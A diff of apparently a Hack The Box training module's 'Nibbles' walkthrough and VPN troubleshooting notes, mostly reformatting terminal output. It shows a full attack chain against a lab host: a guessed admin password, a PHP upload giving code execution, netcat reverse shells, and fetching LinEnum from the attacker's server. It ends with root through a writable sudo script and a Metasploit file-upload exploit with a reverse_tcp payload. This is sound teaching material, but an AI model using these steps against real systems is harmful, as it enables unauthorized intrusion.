+  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
+  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
+  <theme type="string">simpler</theme>
+  <notification_comments type="integer">1</notification_comments>
+  <notification_session_fail type="integer">0</notification_session_fail>
+  <notification_session_start type="integer">0</notification_session_start>
+  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
+  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
+  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
+  <seo_site_description type="string"/>
+  <seo_keywords type="string"/>
+  <seo_robots type="string"/>
+  <seo_google_code type="string"/>
+  <seo_bing_code type="string"/>
+  <seo_author type="string"/>
+  <friendly_urls type="integer">0</friendly_urls>
+  <default_homepage type="integer">0</default_homepage>
+</config>
 ```
 
 Checking it, hoping for passwords proofs fruitless, but we do see two mentions of `nibbles` in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password?
@@ -2452,7 +2646,17 @@ We get a bunch of errors, but it seems like the file may have uploaded.
 Nibbles - Initial Foothold
 
 ```shell
-Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26 Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27 Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117 Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118 Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43 Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
+Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
+
+Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
+
+Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117
+
+Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118
+
+Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
+
+Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
 ```
 
 Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
@@ -2460,7 +2664,9 @@ Now we have to find out where the file uploaded if it was successful. Going back
 Nibbles - Initial Foothold
 
 ```shell
-6165@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+6165@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
+
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
 
 We do! It looks like we have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server.
@@ -2488,7 +2694,9 @@ We upload the file again and start a `netcat` listener in our terminal:
 Nibbles - Initial Foothold
 
 ```shell
-0xdf@htb[/htb]$ nc -lvnp 9443 listening on [any] 9443 ...
+0xdf@htb[/htb]$ nc -lvnp 9443
+
+listening on [any] 9443 ...
 ```
 
 `cURL` the image page again or browse to it in `Firefox` at http://nibbleblog/content/private/plugins/my\_image/image.php to execute the reverse shell.
@@ -2496,13 +2704,20 @@ Nibbles - Initial Foothold
 Nibbles - Initial Foothold
 
 ```shell
-6165@htb[/htb]$ nc -lvnp 9443 listening on [any] 9443 ... connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106 /bin/sh: 0: can't access tty; job control turned off $ id uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+6165@htb[/htb]$ nc -lvnp 9443
+
+listening on [any] 9443 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
 
 Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.
 
 Code: bash
-
+#UpgradeShell 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
@@ -2512,15 +2727,23 @@ Try the various techniques for upgrading to a full TTY and pick one that works b
 Nibbles - Initial Foothold
 
 ```shell
-$ python -c 'import pty; pty.spawn("/bin/bash")' /bin/sh: 3: python: not found $ which python3 /usr/bin/python3
-```
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+/bin/sh: 3: python: not found
+
+$ which python3
+
+/usr/bin/python3```
 
 We have `Python3` though, which works to get us to a friendlier shell by typing `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `personal.zip`.
 
 Nibbles - Initial Foothold
 
 ```shell
-nibbler@Nibbles:/home/nibbler$ ls ls personal.zip user.txt
+nibbler@Nibbles:/home/nibbler$ ls
+
+ls
+personal.zip user.txt
 ```
 
 ---
@@ -2533,7 +2756,13 @@ Now that we have a reverse shell connection, it is time to escalate privileges. 
 Nibbles - Privilege Escalation
 
 ```shell
-nibbler@Nibbles:/home/nibbler$ unzip personal.zip unzip personal.zip Archive: personal.zip creating: personal/ creating: personal/stuff/ inflating: personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler$ unzip personal.zip
+
+unzip personal.zip
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh 
 ```
 
 The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user and writeable.
@@ -2541,7 +2770,45 @@ The shell script `monitor.sh` is a monitoring script, and it is owned by our `ni
 Nibbles - Privilege Escalation
 
 ```shell
-nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh cat monitor.sh #################################################################################################### # Tecmint_monitor.sh # # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/ # # If any bug, report us in the link below # # Free to use/edit/distribute the code below by # # giving proper credit to Tecmint.com and Author # # # #################################################################################################### #! /bin/bash # unset any variable which system may be using # clear the screen clear unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage while getopts iv name do case $name in i)iopt=1;; v)vopt=1;; *)echo "Invalid arg";; esac done <SNIP>
+nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
+
+cat monitor.sh
+                 ####################################################################################################
+
+                 #                                        Tecmint_monitor.sh                                        #
+
+                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
+
+                 # If any bug, report us in the link below                                                          #
+
+                 # Free to use/edit/distribute the code below by                                                    #
+
+                 # giving proper credit to Tecmint.com and Author                                                   #
+
+                 #                                                                                                  #
+
+                 ####################################################################################################
+
+#! /bin/bash
+
+# unset any variable which system may be using
+
+# clear the screen
+
+clear
+
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+while getopts iv name
+do
+       case $name in
+         i)iopt=1;;
+         v)vopt=1;;
+         *)echo "Invalid arg";;
+       esac
+done
+
+ <SNIP>
 ```
 
 Let us put this aside for now and pull in [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks. First, download the script to your local attack VM or the Pwnbox and then start a `Python` HTTP server using the command `sudo python3 -m http.server 8080`.
@@ -2549,7 +2816,11 @@ Let us put this aside for now and pull in [LinEnum.sh](https://raw.githubusercon
 Nibbles - Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ sudo python3 -m http.server 8080 [sudo] password for ben: *********** Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ... 10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
+6165@htb[/htb]$ sudo python3 -m http.server 8080
+[sudo] password for ben: ***********
+
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
 ```
 
 Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script. If successful, we will see a 200 success response on our Python HTTP server. Once the script is pulled over, type `chmod +x LinEnum.sh` to make the script executable and then type `./LinEnum.sh` to run it. We see a ton of interesting output but what immediately catches the eye are `sudo` privileges.
@@ -2557,7 +2828,16 @@ Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the 
 Nibbles - Privilege Escalation
 
 ```shell
-[+] We can sudo without supplying a password! Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh [+] Possible sudo pwnage! /home/nibbler/personal/stuff/monitor.sh
+[+] We can sudo without supplying a password!
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+
+[+] Possible sudo pwnage!
+/home/nibbler/personal/stuff/monitor.sh
 ```
 
 The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a reverse shell one-liner.
@@ -2581,7 +2861,13 @@ Finally, catch the root shell on our waiting `nc` listener.
 Nibbles - Privilege Escalation
 
 ```shell
-6165@htb[/htb]$ nc -lvnp 8443 listening on [any] 8443 ... connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488 # id uid=0(root) gid=0(root) groups=0(root)
+6165@htb[/htb]$ nc -lvnp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
+# id
+
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 From here, we can grab the `root.txt` flag. Finally, we have now solved our first box on HTB. Try to replicate all of the steps on your own. Try various tools to achieve the same effect. We can use many different tools for the various steps required to solve this box. This walkthrough shows one possible method. Make sure to take detailed notes to practice that vital skillset.
@@ -2596,7 +2882,19 @@ As discussed earlier, there is also a `Metasploit` module that works for this bo
 Nibbles - Alternate User Method - Metasploit
 
 ```shell
-msf6 > search nibbleblog Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/nibbleblog_file_upload 2015-09-01 excellent Yes Nibbleblog File Upload Vulnerability Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
+msf6 > search nibbleblog
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+
+-  ----                                       ---------------  ----       -----  -----------
+
+   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
 ```
 
 We can then type `use 0` to load the selected exploit. Set the `rhosts` option as the target IP address and `lhosts` as the IP address of your `tun0` adapter (the one that comes with the VPN connection to HackTheBox).
@@ -2604,7 +2902,13 @@ We can then type `use 0` to load the selected exploit. Set the `rhosts` option a
 Nibbles - Alternate User Method - Metasploit
 
 ```shell
-msf6 > use 0 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190 rhosts => 10.129.42.190 msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 lhost => 10.10.14.2
+msf6 > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+
+msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
+rhosts => 10.129.42.190
+msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 
+lhost => 10.10.14.2
 ```
 
 Type show options to see what other options need to be set.
@@ -2612,7 +2916,35 @@ Type show options to see what other options need to be set.
 Nibbles - Alternate User Method - Metasploit
 
 ```shell
-msf6 exploit(multi/http/nibbleblog_file_upload) > show options Module options (exploit/multi/http/nibbleblog_file_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.129.42.190 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the web application USERNAME yes The username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.2 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Nibbleblog 4.0.3
+msf6 exploit(multi/http/nibbleblog_file_upload) > show options 
+
+Module options (exploit/multi/http/nibbleblog_file_upload):
+
+  Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+  PASSWORD                    yes       The password to authenticate with
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS     10.129.42.190    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+  RPORT      80               yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                yes       The base path to the web application
+  USERNAME                    yes       The username to authenticate with
+  VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+  Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+  LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
+  LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+  Id  Name
+--  ----
+  0   Nibbleblog 4.0.3
 ```
 
 We need to set the admin username and password `admin:nibbles` and the `TARGETURI` to `nibbleblog`.
@@ -2620,7 +2952,12 @@ We need to set the admin username and password `admin:nibbles` and the `TARGETUR
 Nibbles - Alternate User Method - Metasploit
 
 ```shell
-msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin username => admin msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles password => nibbles msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog targeturi => nibbleblog
+msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
+username => admin
+msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
+password => nibbles
+msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
+targeturi => nibbleblog
 ```
 
 We also need to change the payload type. For our purposes let's go with `generic/shell_reverse_tcp`. We put these options and then type `exploit` and receive a reverse shell.
@@ -2628,7 +2965,47 @@ We also need to change the payload type. For our purposes let's go with `generic
 Nibbles - Alternate User Method - Metasploit
 
 ```shell
-msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp payload => generic/shell_reverse_tcp msf6 exploit(multi/http/nibbleblog_file_upload) > show options Module options (exploit/multi/http/nibbleblog_file_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD nibbles yes The password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.129.42.190 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI nibbleblog yes The base path to the web application USERNAME admin yes The username to authenticate with VHOST no HTTP server virtual host Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.2 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Nibbleblog 4.0.3 msf6 exploit(multi/http/nibbleblog_file_upload) > exploit [*] Started reverse TCP handler on 10.10.14.2:4444 [*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000 [+] Deleted image.php id uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
+payload => generic/shell_reverse_tcp
+msf6 exploit(multi/http/nibbleblog_file_upload) > show options 
+
+Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   nibbles          yes       The password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.129.42.190  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  nibbleblog       yes       The base path to the web application
+   USERNAME   admin            yes       The username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.2      yes       The listen address (an interface may be specified)
+   LPORT  4444            yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Nibbleblog 4.0.3
+
+
+msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.2:4444 
+[*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
+[+] Deleted image.php
+
+id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
 
 From here, we can follow the same privilege escalation path.
@@ -2661,7 +3038,11 @@ The easiest method of checking if we have successfully connected to the VPN netw
 Common Pitfalls
 
 ```shell
-6165@htb[/htb]$ sudo openvpn ./htb.ovpn ...SNIP... Initialization Sequence Completed
+6165@htb[/htb]$ sudo openvpn ./htb.ovpn 
+
+...SNIP...
+
+Initialization Sequence Completed
 ```
 
 #### Getting VPN Address
@@ -2671,7 +3052,11 @@ Another way of checking whether we are connected to the VPN network is by checki
 Common Pitfalls
 
 ```shell
-6165@htb[/htb]$ ip -4 a show tun0 6: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500 inet 10.10.10.1/23 scope global tun0 valid_lft forever preferred_lft forever
+6165@htb[/htb]$ ip -4 a show tun0
+
+6: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
+    inet 10.10.10.1/23 scope global tun0
+       valid_lft forever preferred_lft forever
 ```
 
 As long we get our IP back, then we should be connected to the VPN network.
@@ -2683,7 +3068,16 @@ Another way to check for connectivity is to use the command `sudo netstat -rn` t
 Common Pitfalls
 
 ```shell
-6165@htb[/htb]$ sudo netstat -rn [sudo] password for user: Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 0.0.0.0 192.168.195.2 0.0.0.0 UG 0 0 0 eth0 10.10.14.0 0.0.0.0 255.255.254.0 U 0 0 0 tun0 10.129.0.0 10.10.14.1 255.255.0.0 UG 0 0 0 tun0 192.168.1.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0
+6165@htb[/htb]$ sudo netstat -rn
+
+[sudo] password for user: 
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         192.168.195.2   0.0.0.0         UG        0 0          0 eth0
+10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
+10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
+192.168.1.0   0.0.0.0         255.255.255.0   U         0 0          0 eth0
 ```
 
 #### Pinging Gateway
@@ -2693,7 +3087,16 @@ From here, we can see that we are connected to the `10.10.14.0/23` network on th
 Common Pitfalls
 
 ```shell
-6165@htb[/htb]$ ping -c 4 10.10.14.1 PING 10.10.14.1 (10.10.14.1) 56(84) bytes of data. 64 bytes from 10.10.14.1: icmp_seq=1 ttl=64 time=111 ms 64 bytes from 10.10.14.1: icmp_seq=2 ttl=64 time=111 ms 64 bytes from 10.10.14.1: icmp_seq=3 ttl=64 time=111 ms 64 bytes from 10.10.14.1: icmp_seq=4 ttl=64 time=111 ms --- 10.10.14.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3012ms rtt min/avg/max/mdev = 110.574/110.793/111.056/0.174 ms
+6165@htb[/htb]$ ping -c 4 10.10.14.1
+PING 10.10.14.1 (10.10.14.1) 56(84) bytes of data.
+64 bytes from 10.10.14.1: icmp_seq=1 ttl=64 time=111 ms
+64 bytes from 10.10.14.1: icmp_seq=2 ttl=64 time=111 ms
+64 bytes from 10.10.14.1: icmp_seq=3 ttl=64 time=111 ms
+64 bytes from 10.10.14.1: icmp_seq=4 ttl=64 time=111 ms
+
+--- 10.10.14.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3012ms
+rtt min/avg/max/mdev = 110.574/110.793/111.056/0.174 ms
 ```
 
 Finally, we can either attack an assigned target host on the 10.129.0.0/16 network or begin enumeration for live hosts.
@@ -2743,7 +3146,28 @@ In case we start facing some issues with connecting to SSH servers or connecting
 Common Pitfalls
 
 ```shell
-6165@htb[/htb]$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/parrot/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/parrot/.ssh/id_rsa Our public key has been saved in /home/parrot/.ssh/id_rsa.pub The key fingerprint is: SHA256:...SNIP... parrot@parrot The key's randomart image is: +---[RSA 3072]----+ | o.. | | ...SNIP | | ...SNIP | | ...SNIP | | ...SNIP | | ...SNIP | | ...SNIP | | + +oo+o | +----[SHA256]-----+
+6165@htb[/htb]$ ssh-keygen
+
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/parrot/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+
+Your identification has been saved in /home/parrot/.ssh/id_rsa
+Our public key has been saved in /home/parrot/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:...SNIP... parrot@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|            o..  |
+|     ...SNIP     |
+|     ...SNIP     |
+|     ...SNIP     |
+|     ...SNIP     |
+|     ...SNIP     |
+|     ...SNIP     |
+|       + +oo+o   |
++----[SHA256]-----+
 ```
 
 By default, SSH keys are stored in the `.ssh` folder within our home folder (for example, `/home/htb-student/.ssh`). If we wanted to create an ssh key in a different directory, we could enter an absolute path for the key when prompted. We can encrypt our SSH key with a password when prompted or keep it empty if we do not want to use a password.
